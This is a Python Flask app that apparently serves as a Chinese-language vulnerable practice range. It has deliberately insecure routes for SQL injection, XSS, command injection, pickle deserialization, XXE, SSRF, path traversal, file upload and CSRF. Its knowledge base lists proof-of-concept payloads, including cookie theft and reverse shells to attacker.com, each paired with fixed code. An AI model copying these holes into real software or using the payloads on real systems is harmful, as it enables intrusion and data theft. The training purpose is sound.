#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Python漏洞靶场 - 主应用程序
包含以下漏洞类型：
- SQL注入
- XSS (跨站脚本)
- 文件上传
- 文件包含
- 命令执行
- CSRF (跨站请求伪造)
- SSRF (服务端请求伪造)
- XXE (XML外部实体注入)
- 反序列化
- 路径遍历

每个漏洞模块包含：
1. 易受攻击的代码演示
2. 漏洞说明
3. POC（概念验证）示例
4. 修复代码
"""

from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_file, abort
from werkzeug.utils import secure_filename
from werkzeug.security import safe_join
import os
import pickle
import base64
import subprocess
from functools import wraps
import requests
from lxml import etree
import shutil
import re
from urllib.parse import urlparse
import ipaddress

app = Flask(__name__)
app.secret_key = 'vulnerable_secret_key_do_not_use_in_production'
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max-limit

# 确保必要的目录存在
for directory in [app.config['UPLOAD_FOLDER'], 'data', 'data/files']:
    os.makedirs(directory, exist_ok=True)

# ============ 路由装饰器 ============
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('csrf_login'))
        return f(*args, **kwargs)
    return decorated_function

# ============ 主页路由 ============
@app.route('/')
def index():
    """主页 - 漏洞列表"""
    vulnerabilities = [
        {'name': 'SQL注入', 'route': 'sqli', 'description': 'SQL盲注和联合查询注入', 'severity': '严重'},
        {'name': 'XSS (跨站脚本)', 'route': 'xss', 'description': '反射型和存储型XSS', 'severity': '中'},
        {'name': '文件上传', 'route': 'file_upload', 'description': '任意文件上传漏洞', 'severity': '高'},
        {'name': '文件包含', 'route': 'file_include', 'description': '本地文件包含漏洞', 'severity': '高'},
        {'name': '命令执行', 'route': 'command_injection', 'description': '操作系统命令注入', 'severity': '严重'},
        {'name': 'CSRF (跨站请求伪造)', 'route': 'csrf', 'description': '密码修改CSRF', 'severity': '中'},
        {'name': 'SSRF (服务端请求伪造)', 'route': 'ssrf', 'description': '内网扫描和任意URL请求', 'severity': '高'},
        {'name': 'XXE (XML外部实体注入)', 'route': 'xxe', 'description': 'XML外部实体注入', 'severity': '高'},
        {'name': '反序列化', 'route': 'deserialization', 'description': 'Pickles反序列化漏洞', 'severity': '严重'},
        {'name': '路径遍历', 'route': 'path_traversal', 'description': '任意文件读取', 'severity': '高'},
    ]
    return render_template('index.html', vulnerabilities=vulnerabilities)

# ============ 漏洞详情路由 ============
@app.route('/vuln/<vuln_type>')
def vulnerability_detail(vuln_type):
    """显示漏洞详情页面"""
    if vuln_type not in VULNERABILITY_INFO:
        abort(404)
    return render_template('vuln_detail.html', vuln_type=vuln_type, info=VULNERABILITY_INFO[vuln_type])

# ============ 简单漏洞演示路由 ============
@app.route('/sqli/demo', methods=['GET', 'POST'])
def sqli_demo():
    """SQL注入演示"""
    error = None
    result = None
    query_shown = None
    
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # 危险：直接拼接SQL语句
        query_shown = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        
        # 模拟数据库响应
        if username == "admin" and password == "admin123":
            result = "登录成功！用户: admin, 角色: 管理员"
        elif username == "admin":
            result = "密码错误"
        else:
            result = "用户不存在或密码错误"
    
    return render_template('sqli_demo.html', error=error, result=result, query=query_shown)

@app.route('/xss/demo', methods=['GET', 'POST'])
def xss_demo():
    """XSS演示"""
    result = None
    search_term = ''
    
    if request.method == 'POST':
        search_term = request.form.get('search', '')
        # 危险：直接输出用户输入
        result = f'搜索 "{search_term}" 的结果...'
    
    return render_template('xss_demo.html', result=result, search_term=search_term)

@app.route('/file_upload/demo', methods=['GET', 'POST'])
def file_upload_demo():
    """文件上传演示"""
    message = None
    uploaded_file = None
    
    if request.method == 'POST':
        if 'file' not in request.files:
            message = '没有选择文件'
        else:
            file = request.files['file']
            if file.filename == '':
                message = '没有选择文件'
            else:
                # 危险：直接保存上传的文件
                filename = file.filename
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
                message = f'文件 "{filename}" 上传成功'
                uploaded_file = filename
    
    return render_template('file_upload_demo.html', message=message, uploaded_file=uploaded_file)

@app.route('/command_injection/demo', methods=['GET', 'POST'])
def command_injection_demo():
    """命令注入演示"""
    output = None
    command = None
    
    if request.method == 'POST':
        target_ip = request.form.get('ip', '127.0.0.1')
        command = f"ping -c 3 {target_ip}"
        
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=5
            )
            output = result.stdout if result.stdout else result.stderr
        except subprocess.TimeoutExpired:
            output = '命令执行超时'
        except Exception as e:
            output = str(e)
    
    return render_template('command_injection_demo.html', output=output, command=command)

@app.route('/ssrf/demo', methods=['GET', 'POST'])
def ssrf_demo():
    """SSRF演示"""
    result = None
    url = None
    
    if request.method == 'POST':
        url = request.form.get('url', '')
        
        try:
            # 危险：直接请求用户提供的URL
            response = requests.get(url, timeout=10, allow_redirects=False)
            result = {
                'status_code': response.status_code,
                'content': response.text[:500] if len(response.text) > 500 else response.text,
                'headers': dict(list(response.headers.items())[:5])
            }
        except requests.exceptions.RequestException as e:
            result = {'error': str(e)}
    
    return render_template('ssrf_demo.html', result=result, url=url)

@app.route('/xxe/demo', methods=['GET', 'POST'])
def xxe_demo():
    """XXE演示"""
    result = None
    xml_data = None
    
    if request.method == 'POST':
        xml_data = request.form.get('xml', '')
        
        try:
            # 危险：使用易受XXE攻击的配置
            parser = etree.XMLParser(resolve_entities=True)
            tree = etree.fromstring(xml_data.encode(), parser)
            
            parsed = {}
            for element in tree:
                parsed[element.tag] = element.text
            
            result = parsed
        except Exception as e:
            result = {'error': str(e)}
    
    return render_template('xxe_demo.html', result=result, xml_data=xml_data)

@app.route('/deserialization/demo', methods=['GET', 'POST'])
def deserialization_demo():
    """反序列化演示"""
    result = None
    data_value = None
    
    if request.method == 'POST':
        # 创建默认序列化数据
        class SampleData:
            def __init__(self):
                self.user = 'guest'
                self.role = 'visitor'
        
        default_data = SampleData()
        serialized = pickle.dumps(default_data)
        serialized_base64 = base64.b64encode(serialized).decode()
        
        user_data = request.form.get('data', serialized_base64)
        data_value = user_data
        
        try:
            decoded = base64.b64decode(user_data)
            # 危险：直接反序列化
            deserialized = pickle.loads(decoded)
            result = deserialized
        except Exception as e:
            result = {'error': str(e)}
    
    return render_template('deserialization_demo.html', result=result, data_value=data_value)

@app.route('/path_traversal/demo', methods=['GET', 'POST'])
def path_traversal_demo():
    """路径遍历演示"""
    content = None
    filename = None
    
    # 创建示例文件
    os.makedirs('data/files', exist_ok=True)
    if not os.path.exists('data/files/readme.txt'):
        with open('data/files/readme.txt', 'w', encoding='utf-8') as f:
            f.write('这是一个示例文件。\n')
            f.write('敏感信息：admin_password = secret123\n')
    
    if request.method == 'POST':
        filename = request.form.get('filename', 'readme.txt')
        
        try:
            # 危险：直接读取用户指定的文件
            filepath = os.path.join('data/files', filename)
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
        except Exception as e:
            content = {'error': str(e)}
    
    return render_template('path_traversal_demo.html', content=content, filename=filename)

# ============ CSRF路由 ============
@app.route('/csrf')
def csrf():
    """CSRF漏洞首页"""
    if 'logged_in' in session:
        return render_template('csrf.html', logged_in=True, username=session.get('username'))
    return render_template('csrf.html', logged_in=False)

@app.route('/csrf/login', methods=['GET', 'POST'])
def csrf_login():
    """CSRF漏洞登录"""
    if request.method == 'POST':
        username = request.form.get('username', '')
        session['logged_in'] = True
        session['username'] = username
        return redirect(url_for('csrf'))
    
    return render_template('csrf_login.html')

@app.route('/csrf/change_password', methods=['GET', 'POST'])
@login_required
def csrf_change_password():
    """易受CSRF攻击的密码修改接口"""
    if request.method == 'POST':
        new_password = request.form.get('new_password', '')
        # 危险：没有CSRF token验证
        session['password'] = new_password
        
        return jsonify({
            'message': f'密码已修改为: {new_password}',
            'warning': '警告：此接口未实现CSRF防护，可以构造恶意页面修改用户密码'
        })
    
    return render_template('csrf.html', logged_in=True, username=session.get('username'))

@app.route('/csrf/logout')
def csrf_logout():
    """退出登录"""
    session.clear()
    return redirect(url_for('csrf'))

# ============ 文件包含演示 ============
@app.route('/file_include/demo')
def file_include_demo():
    """文件包含演示"""
    filename = request.args.get('file', 'hello.txt')
    
    # 创建示例文件
    if not os.path.exists('data/hello.txt'):
        with open('data/hello.txt', 'w', encoding='utf-8') as f:
            f.write('hello, world!')
    
    try:
        # 危险：直接读取用户指定的文件
        with open(f'data/{filename}', 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return jsonify({
            'file': filename,
            'content': content,
            'warning': '警告：这是易受攻击的文件包含接口，尝试使用 ../ 访问其他文件'
        })
    except Exception as e:
        return jsonify({
            'error': str(e),
            'warning': '提示：尝试使用路径遍历访问其他文件'
        })

# ============ 辅助路由 ============
@app.route('/uploads/<filename>')
def uploaded_file(filename):
    """查看上传的文件"""
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/reset')
def reset():
    """重置靶场数据"""
    try:
        if os.path.exists('data'):
            shutil.rmtree('data')
        os.makedirs('data', exist_ok=True)
        os.makedirs('data/files', exist_ok=True)
        
        # 清空上传目录
        if os.path.exists(app.config['UPLOAD_FOLDER']):
            for filename in os.listdir(app.config['UPLOAD_FOLDER']):
                file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                try:
                    if os.path.isfile(file_path):
                        os.unlink(file_path)
                except Exception as e:
                    print(f"Error deleting {file_path}: {e}")
        
        return jsonify({'message': '靶场已重置'})
    except Exception as e:
        return jsonify({'error': str(e)}, 500)

# ============ 导入漏洞知识库 ============
VULNERABILITY_INFO = {
    'sqli': {
        'title': 'SQL注入',
        'severity': '严重',
        'description': '''SQL注入是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意SQL代码，来欺骗后端数据库执行非预期的SQL命令。

攻击者可以利用SQL注入：
- 绕过身份验证
- 读取敏感数据（如用户密码、信用卡信息）
- 修改或删除数据库中的数据
- 在某些情况下执行操作系统命令
- 获取数据库服务器的访问权限

**常见场景：**
- 登录表单
- 搜索功能
- 用户资料编辑
- 商品筛选
- 报表查询''',
        'poc': '''# POC 1: SQL注入登录绕过
# 在登录表单的用户名和密码字段输入：
Username: ' OR '1'='1
Password: ' OR '1'='1

# POC 2: 联合查询注入
# 在搜索框输入：
Keyword: ' UNION SELECT username, password, null FROM users--

# POC 3: 布尔盲注
Keyword: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--''',
        'vulnerable_code': '''def vulnerable_login(username, password):
    # ⚠️ 危险：直接拼接SQL语句
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)
    result = cursor.fetchone()
    return result''',
        'fixed_code': '''def secure_login(username, password):
    # ✅ 安全：使用参数化查询
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor.execute(query, (username, password))
    result = cursor.fetchone()
    return result'''
    },
    'xss': {
        'title': 'XSS (跨站脚本攻击)',
        'severity': '中',
        'description': '''跨站脚本攻击是一种安全漏洞，攻击者可以在受害者的浏览器中执行恶意脚本。

三种XSS类型：
1. 反射型XSS：恶意脚本包含在URL参数中
2. 存储型XSS：恶意脚本存储在服务器数据库中
3. DOM型XSS：漏洞存在于客户端JavaScript代码中''',
        'poc': '''# POC 1: 反射型XSS
http://target.com/search?q=<script>alert(document.cookie)</script>

# POC 2: 存储型XSS
<script>
  var img = new Image();
  img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>

# POC 3: 事件处理器绕过
<img src=x onerror="alert(document.cookie)">''',
        'vulnerable_code': '''def vulnerable_search(request):
    keyword = request.args.get('q', '')
    # ⚠️ 危险：直接输出用户输入，未经HTML转义
    return f'搜索结果: {keyword}' ''',
        'fixed_code': '''from flask import escape

def secure_search(request):
    keyword = request.args.get('q', '')
    # ✅ 安全：对输出进行HTML转义
    return f'搜索结果: {escape(keyword)}' '''
    },
    'file_upload': {
        'title': '文件上传漏洞',
        'severity': '高',
        'description': '''文件上传漏洞是指应用程序在处理用户上传的文件时，没有正确验证文件类型、内容或目标位置，导致攻击者可以上传恶意文件。

攻击危害：
- 上传Web Shell获取服务器控制权
- 上传恶意脚本执行任意代码
- 利用文件名漏洞进行路径遍历''',
        'poc': '''# POC 1: 上传PHP Web Shell
<?php system($_GET['cmd']); ?>

# POC 2: 文件名路径遍历
上传文件名为: ../../../var/www/html/shell.php

# POC 3: 修改MIME类型
Content-Type: image/jpeg
但实际上传PHP文件''',
        'vulnerable_code': '''def vulnerable_upload(request):
    if 'file' in request.files:
        file = request.files['file']
        # ⚠️ 危险：没有验证文件类型
        filename = file.filename
        file.save(f'uploads/{filename}')
        return '上传成功' ''',
        'fixed_code': '''def secure_upload(request):
    if 'file' not in request.files:
        return '没有选择文件'
    
    file = request.files['file']
    
    # ✅ 安全：验证扩展名
    ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
    if '.' in file.filename:
        ext = file.filename.rsplit('.', 1)[1].lower()
        if ext not in ALLOWED_EXTENSIONS:
            return '不支持的文件类型'
    
    # ✅ 安全：使用安全的文件名
    filename = secure_filename(file.filename)
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
    return '上传成功' '''
    },
    'file_include': {
        'title': '文件包含漏洞',
        'severity': '高',
        'description': '''文件包含漏洞是指应用程序在包含文件时，没有正确验证用户输入的文件路径，允许攻击者访问任意文件。

两种类型：
1. 本地文件包含（LFI）：包含服务器本地的文件
2. 远程文件包含（RFI）：包含远程服务器上的文件

攻击危害：
- 读取敏感配置文件
- 读取源代码
- 执行任意代码''',
        'poc': '''# POC 1: 读取系统敏感文件
view.php?file=../../../../etc/passwd

# POC 2: URL编码绕过
view.php?file=%2e%2e%2fetc%2fpasswd

# POC 3: 远程文件包含
view.php?file=http://attacker.com/shell.php''',
        'vulnerable_code': '''def vulnerable_view_file(filename):
    # ⚠️ 危险：直接包含用户指定的文件
    with open(f'data/{filename}', 'r') as f:
        content = f.read()
    return content ''',
        'fixed_code': '''def secure_view_file(filename):
    # ✅ 安全：使用白名单
    ALLOWED_FILES = {'readme.txt', 'about.txt'}
    
    if filename not in ALLOWED_FILES:
        raise ValueError('不允许的文件')
    
    filepath = os.path.join('data', filename)
    with open(filepath, 'r') as f:
        return f.read() '''
    },
    'command_injection': {
        'title': '命令注入',
        'severity': '严重',
        'description': '''命令注入是一种漏洞，应用程序直接将用户输入拼接到系统命令中执行，允许攻击者执行任意操作系统命令。

攻击危害：
- 完全控制服务器
- 读取/修改/删除文件
- 获取root/admin权限''',
        'poc': '''# POC 1: 基本命令注入
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami

# POC 2: 读取敏感文件
127.0.0.1; cat /etc/passwd

# POC 3: 反弹Shell
127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1''',
        'vulnerable_code': '''def vulnerable_ping(ip_address):
    # ⚠️ 危险：直接拼接用户输入到命令
    command = f"ping -c 4 {ip_address}"
    output = subprocess.run(command, shell=True, capture_output=True)
    return output.stdout ''',
        'fixed_code': '''def secure_ping(ip_address):
    # ✅ 安全：输入验证
    if not re.match(r'^[0-9.]+$', ip_address):
        raise ValueError('无效的IP地址')
    
    # ✅ 安全：不使用shell=True
    command = ['ping', '-c', '4', ip_address]
    result = subprocess.run(command, capture_output=True)
    return result.stdout '''
    },
    'csrf': {
        'title': 'CSRF (跨站请求伪造)',
        'severity': '中',
        'description': '''跨站请求伪造是一种攻击方式，攻击者诱导用户在已登录的网站上执行非本意的操作。

攻击原理：
1. 用户登录目标网站
2. 用户访问恶意网站
3. 恶意网站向目标网站发起请求（利用用户的cookie）''',
        'poc': '''# POC 1: 简单的CSRF攻击页面
<html>
<body>
  <img src="http://site.com/transfer?to=attacker&amount=10000">
</body>
</html>

# POC 2: 使用表单自动提交
<html>
<body onload="document.csrf.submit()">
  <form name="csrf" action="http://site.com/change_password" method="POST">
    <input type="hidden" name="new_password" value="Hacked123">
  </form>
</body>
</html>''',
        'vulnerable_code': '''@app.route('/change_password', methods=['POST'])
def vulnerable_change_password():
    new_password = request.form['new_password']
    # ⚠️ 危险：没有CSRF token验证
    db.execute("UPDATE users SET password = ?", (new_password, session['user_id']))
    return '密码修改成功' ''',
        'fixed_code': '''# ✅ 使用Flask-WTF
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/change_password', methods=['POST'])
def secure_change_password():
    # 自动验证CSRF token
    new_password = request.form['new_password']
    db.execute("UPDATE users SET password = ?", (new_password, session['user_id']))
    return '密码修改成功' '''
    },
    'ssrf': {
        'title': 'SSRF (服务端请求伪造)',
        'severity': '高',
        'description': '''服务器端请求伪造漏洞允许攻击者通过服务器向指定URL发起请求。

攻击危害：
- 扫描内网端口和服务
- 访问内网敏感服务
- 读取本地文件（file://协议）
- 访问AWS/Azure元数据''',
        'poc': '''# POC 1: 扫描内网端口
http://target.com/fetch?url=http://127.0.0.1:22
http://target.com/fetch?url=http://127.0.0.1:3306

# POC 2: 访问内网其他服务器
http://target.com/fetch?url=http://192.168.1.1

# POC 3: 获取AWS Metadata
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/''',
        'vulnerable_code': '''def vulnerable_fetch_url(url):
    # ⚠️ 危险：直接请求用户提供的URL
    response = requests.get(url)
    return response.text ''',
        'fixed_code': '''def secure_fetch_url(url):
    # ✅ 安全：阻止内网访问
    PRIVATE_IP_PREFIXES = {'10.', '172.', '192.168.', '127.', '0.', '169.254.'}
    
    parsed = urlparse(url)
    for prefix in PRIVATE_IP_PREFIXES:
        if parsed.hostname and parsed.hostname.startswith(prefix):
            raise ValueError('不允许访问内网地址')
    
    response = requests.get(url, timeout=10, allow_redirects=False)
    return response.text '''
    },
    'xxe': {
        'title': 'XXE (XML外部实体注入)',
        'severity': '高',
        'description': '''XML外部实体注入是一种漏洞，攻击者可以通过XML文档中的实体定义读取文件、扫描内网。

攻击危害：
- 读取本地敏感文件
- 内网端口扫描
- SSRF攻击
- DOS攻击''',
        'poc': '''# POC 1: 读取本地文件
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

# POC 2: Blind XXE
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo></foo>''',
        'vulnerable_code': '''def vulnerable_parse_xml(xml_string):
    # ⚠️ 危险：启用实体解析
    parser = etree.XMLParser(resolve_entities=True)
    tree = etree.fromstring(xml_string, parser)
    return tree ''',
        'fixed_code': '''from defusedxml.lxml import fromstring

def secure_parse_xml(xml_string):
    # ✅ 安全：使用defusedxml库
    tree = fromstring(xml_string)
    return tree '''
    },
    'deserialization': {
        'title': '反序列化漏洞',
        'severity': '严重',
        'description': '''反序列化漏洞是指在反序列化不可信数据时，攻击者可以构造恶意数据导致代码执行或拒绝服务。

攻击危害：
- 远程代码执行（RCE）
- 权限提升
- 数据泄露''',
        'poc': '''# POC 1: Python Pickle任意代码执行
class Exploit:
    def __reduce__(self):
        return (__import__('os').system, ('whoami',))

import pickle, base64
malicious = pickle.dumps(Exploit())
malicious_base64 = base64.b64encode(malicious).decode()

# POC 2: 反弹Shell
class ReverseShell:
    def __reduce__(self):
        return (__import__('os').system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))''',
        'vulnerable_code': '''@app.route('/load_state')
def vulnerable_load_state():
    user_state = request.cookies.get('user_state', '')
    if user_state:
        # ⚠️ 危险：直接反序列化不可信数据
        decoded = base64.b64decode(user_state)
        user_data = pickle.loads(decoded)
        session.update(user_data)
    return '状态已加载' ''',
        'fixed_code': '''import json

def secure_load_state():
    user_state = request.cookies.get('user_state', '')
    if user_state:
        # ✅ 安全：使用JSON
        decoded = base64.b64decode(user_state)
        user_data = json.loads(decoded.decode())
        session.update(user_data)
    return '状态已加载' '''
    },
    'path_traversal': {
        'title': '路径遍历',
        'severity': '高',
        'description': '''路径遍历是指应用程序没有正确验证用户提供的文件路径，允许攻击者访问应用程序预期目录之外的文件。

攻击危害：
- 读取敏感配置文件
- 读取源代码
- 信息泄漏

常见绕过技巧：
- ../序列
- URL编码
- NULL字节''',
        'poc': '''# POC 1: 基本路径遍历
view.php?file=../../../../etc/passwd

# POC 2: URL编码绕过
view.php?file=%2e%2e%2fetc%2fpasswd

# POC 3: NULL字节
view.php?file=../../../etc/passwd%00.jpg''',
        'vulnerable_code': '''@app.route('/download')
def vulnerable_download():
    filename = request.args.get('file', 'readme.txt')
    # ⚠️ 危险：直接拼接文件路径
    filepath = os.path.join('files', filename)
    return send_file(filepath) ''',
        'fixed_code': '''@app.route('/download')
def secure_download():
    filename = request.args.get('file', 'readme.txt')
    
    # ✅ 安全：使用safe_join防止路径遍历
    filepath = safe_join('files', filename)
    
    if filepath is None:
        return '无效的文件路径', 400
    
    # ✅ 安全：额外验证
    real_path = os.path.abspath(filepath)
    files_path = os.path.abspath('files')
    
    if not real_path.startswith(files_path):
        return '访问被拒绝', 403
    
    return send_file(filepath) '''
    }
}

if __name__ == '__main__':
    print("""
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║        Python 漏洞靶场启动成功！                            ║
║                                                            ║
║        包含漏洞类型：                                        ║
║        - SQL注入                                           ║
║        - XSS (跨站脚本)                                    ║
║        - 文件上传                                          ║
║        - 文件包含                                          ║
║        - 命令执行                                          ║
║        - CSRF (跨站请求伪造)                               ║
║        - SSRF (服务端请求伪造)                             ║
║        - XXE (XML外部实体注入)                             ║
║        - 反序列化                                          ║
║        - 路径遍历                                          ║
║                                                            ║
║        警告：此靶场仅供学习使用！切勿用于非法用途！         ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True)
